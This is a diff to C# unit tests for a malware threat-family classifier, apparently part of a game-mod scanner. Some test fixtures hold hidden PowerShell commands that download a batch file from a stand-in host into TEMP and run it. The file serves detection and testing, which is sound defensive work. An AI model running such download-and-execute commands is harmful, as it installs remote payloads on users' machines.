@@ -50,6 +50,34 @@ public class ThreatFamilyClassifierTests
     }
 
     [Fact]
+    public void Classify_WithExecutionPolicyBypassIwrStartProcessTempBatch_ReturnsPowerShellIwrFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("HutongGames.PlayMaker.ObjectTypeAttribute.Load:59",
+                "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". " +
+                "Arguments: -ep bypass -c \"iwr 'https://example.invalid/usa/USAMAGA2022.bat' -out $env:TEMP\\dl.bat -useb; " +
+                "if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; Start-Sleep -Seconds 120; " +
+                "Remove-Item $env:TEMP\\dl.bat -Force }\" [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory=Temp] " +
+                "[Staged loader chain (download -> temp drop -> execute)]",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule"
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle();
+        matches[0].FamilyId.Should().Be("family-powershell-iwr-dlbat-v1");
+        matches[0].VariantId.Should().Be("powershell-iwr-dlbat-cleanup");
+        matches[0].MatchKind.Should().Be(ThreatMatchKind.BehaviorVariant);
+        matches[0].ExactHashMatch.Should().BeFalse();
+        matches[0].MatchedRules.Should().Contain("ProcessStartRule");
+    }
+
+    [Fact]
     public void Classify_WithEmbeddedResourceDataFlowAndShellCallChain_ReturnsBehaviorMatch()
     {
         var classifier = new ThreatFamilyClassifier();
@@ -515,13 +543,13 @@ public class ThreatFamilyClassifierTests
     }
 
     [Fact]
-    public void Classify_WithAssemblyLoadAndReflectiveInvoke_ReturnsDynamicAssemblyLoaderFamily()
+    public void Classify_WithAssemblyLoadAndReflectiveInvokeWithoutExecutionEvidence_DoesNotReturnDynamicAssemblyLoaderFamily()
     {
         var classifier = new ThreatFamilyClassifier();
         var findings = new List<ScanFinding>
         {
             new("ClearView.Plugin.LaunchMod:11",
-                "Detected dynamic assembly loading with risk indicators.",
+                "Dynamic assembly load detected (Assembly.LoadFrom(string), score 50)",
                 Severity.High)
             {
                 RuleId = "AssemblyDynamicLoadRule"
@@ -536,9 +564,44 @@ public class ThreatFamilyClassifierTests
 
         var matches = classifier.Classify(findings, null);
 
-        matches.Should().ContainSingle();
-        matches[0].FamilyId.Should().Be("family-dynamic-assembly-reflection-loader-v1");
-        matches[0].VariantId.Should().Be("assembly-load-reflective-invoke");
+        matches.Should().NotContain(match => match.FamilyId == "family-dynamic-assembly-reflection-loader-v2",
+            "local or unresolved plugin loaders need confirmed execution behavior before becoming a KnownThreat family");
+    }
+
+    [Fact]
+    public void Classify_WithOpaqueAssemblyLoadReflectiveInvokeAndConfirmedExecution_ReturnsDynamicAssemblyLoaderFamily()
+    {
+        var classifier = new ThreatFamilyClassifier();
+        var findings = new List<ScanFinding>
+        {
+            new("GUI_Tweaks.GUI_Tweaks.LoadMWCGameLogo:11",
+                "Dynamic assembly load detected (Assembly.Load(byte[]), score 90): provenance: resource",
+                Severity.Critical)
+            {
+                RuleId = "AssemblyDynamicLoadRule",
+                RiskScore = 90,
+                BypassCompanionCheck = true
+            },
+            new("GUI_Tweaks.GUI_Tweaks.LoadMWCGameLogo:46",
+                "Reflection invocation with non-literal target method name (cannot determine what is being invoked) - combined with other suspicious patterns",
+                Severity.High)
+            {
+                RuleId = "ReflectionRule"
+            },
+            new("Embedded resource 'GUI_Tweaks.Resources.image.jpg' -> Image.jpg.GetImage:65",
+                "Embedded assembly 'GUI_Tweaks.Resources.image.jpg' finding: Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: -WindowStyle Hidden -Command \"iwr https://example.invalid/payload.bat -out $env:TEMP\\dl.bat\" [Evasion: CreateNoWindow=true]",
+                Severity.Critical)
+            {
+                RuleId = "ProcessStartRule",
+                BypassCompanionCheck = true
+            }
+        };
+
+        var matches = classifier.Classify(findings, null);
+
+        matches.Should().ContainSingle(match =>
+            match.FamilyId == "family-dynamic-assembly-reflection-loader-v2" &&
+            match.VariantId == "assembly-load-reflective-invoke-confirmed-payload");
     }
 
     [Fact]
@@ -577,9 +640,9 @@ public class ThreatFamilyClassifierTests
 
         var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);
 
-        matches.Should().ContainSingle(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v1");
-        matches.Single(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v1").VariantId
-            .Should().Be("dynamic-code-loader-hidden-svchost");
+        matches.Should().ContainSingle(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v2");
+        matches.Single(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v2").VariantId
+            .Should().Be("dynamic-code-loader-hidden-system-process");
     }
 
     [Fact]
